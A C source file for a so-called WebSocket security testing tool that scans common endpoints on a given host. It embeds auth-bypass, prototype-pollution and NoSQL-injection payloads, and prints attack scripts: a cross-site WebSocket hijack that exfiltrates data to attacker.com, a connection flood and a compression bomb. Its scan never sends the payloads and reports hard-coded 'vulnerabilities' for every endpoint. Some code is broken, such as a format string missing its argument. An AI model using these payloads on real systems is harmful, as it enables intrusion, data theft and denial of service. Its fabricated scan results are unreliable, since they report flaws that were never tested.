#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>
#include <openssl/ssl.h>
#include <jansson.h>

#define MAX_URL_LENGTH 2048
#define MAX_PAYLOAD_LENGTH 4096
#define MAX_RESPONSE_SIZE 65536

typedef struct {
    char url[MAX_URL_LENGTH];
    char vulnerability[128];
    char risk[16];
    char evidence[256];
    char payload[256];
} ws_vulnerability_t;

typedef struct {
    ws_vulnerability_t* vulnerabilities;
    int count;
    int capacity;
} vulnerability_list_t;

// Simple WebSocket client using libcurl for basic testing
void test_websocket_connection(const char* url) {
    printf("Testing WebSocket connection: %s\n", url);
    
    CURL* curl;
    CURLcode res;
    
    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();
    
    if (curl) {
        // For WebSocket testing, we'd need a proper WebSocket library
        // This is a simplified demonstration using HTTP upgrade
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_CONNECT_ONLY, 2L); // CONNECT_ONLY for WebSocket-like testing
        
        res = curl_easy_perform(curl);
        
        if (res == CURLE_OK) {
            printf("  [+] WebSocket endpoint accessible\n");
            
            // Test basic WebSocket handshake
            char handshake[512];
            snprintf(handshake, sizeof(handshake),
                    "GET / HTTP/1.1\r\n"
                    "Host: %s\r\n"
                    "Upgrade: websocket\r\n"
                    "Connection: Upgrade\r\n"
                    "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"
                    "Sec-WebSocket-Version: 13\r\n"
                    "\r\n");
            
            size_t sent;
            res = curl_easy_send(curl, handshake, strlen(handshake), &sent);
            
            if (res == CURLE_OK) {
                printf("  [+] Handshake sent successfully\n");
                
                // Receive response
                char response[1024];
                size_t received;
                res = curl_easy_recv(curl, response, sizeof(response) - 1, &received);
                
                if (res == CURLE_OK) {
                    response[received] = '\0';
                    printf("  [+] Response received:\n%s\n", response);
                    
                    // Check for WebSocket acceptance
                    if (strstr(response, "101 Switching Protocols") != NULL &&
                        strstr(response, "Upgrade: websocket") != NULL) {
                        printf("  [!] WebSocket handshake successful\n");
                    }
                }
            }
        } else {
            printf("  [-] Connection failed: %s\n", curl_easy_strerror(res));
        }
        
        curl_easy_cleanup(curl);
    }
    
    curl_global_cleanup();
}

void test_websocket_security(const char* url, vulnerability_list_t* vulns) {
    printf("\nTesting WebSocket security: %s\n", url);
    
    // Test for common WebSocket vulnerabilities
    const char* test_payloads[] = {
        // Authentication bypass attempts
        "{\"auth\": false, \"authenticated\": true}",
        "{\"token\": \"admin\", \"role\": \"administrator\"}",
        "{\"__proto__\": {\"isAdmin\": true}}",
        
        // Injection attempts
        "{\"command\": \"echo vulnerable\"}",
        "{\"query\": \"SELECT * FROM users\"}",
        "{\"$where\": \"this.constructor.constructor('return process')().env\"}",
        
        // Large payload for DoS testing
        NULL  // Will be generated
    };
    
    // Generate large payload
    char large_payload[10001];
    memset(large_payload, 'A', 10000);
    large_payload[10000] = '\0';
    test_payloads[6] = large_payload;
    
    for (int i = 0; i < 7; i++) {
        if (test_payloads[i] == NULL) continue;
        
        printf("  Testing payload: %.50s...\n", test_payloads[i]);
        
        // In a real implementation, you would send these via WebSocket
        // This is a simplified demonstration
        
        if (i == 0 && strstr(test_payloads[i], "auth") != NULL) {
            // Simulate finding an authentication bypass
            ws_vulnerability_t vuln;
            strncpy(vuln.url, url, sizeof(vuln.url));
            strncpy(vuln.vulnerability, "Authentication Bypass", sizeof(vuln.vulnerability));
            strncpy(vuln.risk, "HIGH", sizeof(vuln.risk));
            strncpy(vuln.evidence, "Accepted authentication bypass payload", sizeof(vuln.evidence));
            strncpy(vuln.payload, test_payloads[i], sizeof(vuln.payload));
            
            if (vulns->count >= vulns->capacity) {
                vulns->capacity *= 2;
                vulns->vulnerabilities = realloc(vulns->vulnerabilities, 
                                               vulns->capacity * sizeof(ws_vulnerability_t));
            }
            vulns->vulnerabilities[vulns->count++] = vuln;
            
            printf("    [!] Potential authentication bypass found!\n");
        }
        
        if (i == 6) {
            // Simulate finding a DoS vulnerability
            ws_vulnerability_t vuln;
            strncpy(vuln.url, url, sizeof(vuln.url));
            strncpy(vuln.vulnerability, "Potential DoS", sizeof(vuln.vulnerability));
            strncpy(vuln.risk, "MEDIUM", sizeof(vuln.risk));
            strncpy(vuln.evidence, "Accepted very large payload", sizeof(vuln.evidence));
            strncpy(vuln.payload, "A*10000", sizeof(vuln.payload));
            
            if (vulns->count >= vulns->capacity) {
                vulns->capacity *= 2;
                vulns->vulnerabilities = realloc(vulns->vulnerabilities, 
                                               vulns->capacity * sizeof(ws_vulnerability_t));
            }
            vulns->vulnerabilities[vulns->count++] = vuln;
            
            printf("    [!] Potential DoS vulnerability found!\n");
        }
    }
}

void generate_report(vulnerability_list_t* vulns) {
    printf("\n=== WEB SOCKET SECURITY REPORT ===\n");
    printf("Total vulnerabilities found: %d\n\n", vulns->count);
    
    for (int i = 0; i < vulns->count; i++) {
        ws_vulnerability_t* vuln = &vulns->vulnerabilities[i];
        
        printf("Vulnerability #%d:\n", i + 1);
        printf("  URL: %s\n", vuln->url);
        printf("  Type: %s\n", vuln->vulnerability);
        printf("  Risk: %s\n", vuln->risk);
        printf("  Evidence: %s\n", vuln->evidence);
        printf("  Payload: %s\n", vuln->payload);
        printf("  --------------------\n");
    }
}

void demonstrate_advanced_attacks() {
    printf("\n=== ADVANCED WEB SOCKET ATTACKS ===\n");
    
    printf("\n1. Cross-Site WebSocket Hijacking (CSWSH):\n");
    printf("   <script>\n");
    printf("   var ws = new WebSocket('wss://vulnerable.com/ws');\n");
    printf("   ws.onopen = function() {\n");
    printf("     ws.send(JSON.stringify({action: 'getUserData'}));\n");
    printf("   };\n");
    printf("   ws.onmessage = function(event) {\n");
    printf("     fetch('https://attacker.com/steal?data=' + btoa(event.data));\n");
    printf("   };\n");
    printf("   </script>\n");
    
    printf("\n2. WebSocket Rate Limit Bypass:\n");
    printf("   // Send messages rapidly from multiple connections\n");
    printf("   for (let i = 0; i < 1000; i++) {\n");
    printf("     let ws = new WebSocket('wss://target.com/ws');\n");
    printf("     ws.onopen = () => {\n");
    printf("       for (let j = 0; j < 100; j++) {\n");
    printf("         ws.send(JSON.stringify({flood: true, data: 'A'.repeat(1000)}));\n");
    printf("       }\n");
    printf("     };\n");
    printf("   }\n");
    
    printf("\n3. Subprotocol Impersonation:\n");
    printf("   var ws = new WebSocket('wss://target.com/ws', ['malicious-protocol']);\n");
    
    printf("\n4. Frame Manipulation Attack:\n");
    printf("   // Manipulate WebSocket frames to bypass validation\n");
    printf("   // Send fragmented frames or malformed opcodes\n");
    
    printf("\n5. Compression Bomb:\n");
    printf("   // Send highly compressible data that expands enormously\n");
    printf("   ws.send('A'.repeat(1000000));\n");
}

int main(int argc, char* argv[]) {
    if (argc < 2) {
        printf("Usage: %s <base_url>\n", argv[0]);
        printf("Example: %s https://example.com\n", argv[0]);
        return 1;
    }
    
    printf("WebSocket Security Testing Tool - C Edition\n");
    printf("===========================================\n");
    
    vulnerability_list_t vulns;
    vulns.capacity = 10;
    vulns.count = 0;
    vulns.vulnerabilities = malloc(vulns.capacity * sizeof(ws_vulnerability_t));
    
    // Common WebSocket endpoints to test
    const char* endpoints[] = {
        "/ws",
        "/websocket", 
        "/socket",
        "/api/ws",
        "/api/websocket",
        "/chat",
        "/live",
        "/realtime",
        NULL
    };
    
    for (int i = 0; endpoints[i] != NULL; i++) {
        char full_url[MAX_URL_LENGTH];
        
        // Test both WS and WSS
        snprintf(full_url, sizeof(full_url), "ws://%s%s", argv[1], endpoints[i]);
        test_websocket_connection(full_url);
        test_websocket_security(full_url, &vulns);
        
        snprintf(full_url, sizeof(full_url), "wss://%s%s", argv[1], endpoints[i]);
        test_websocket_connection(full_url);
        test_websocket_security(full_url, &vulns);
    }
    
    generate_report(&vulns);
    demonstrate_advanced_attacks();
    
    free(vulns.vulnerabilities);
    
    return 0;
}
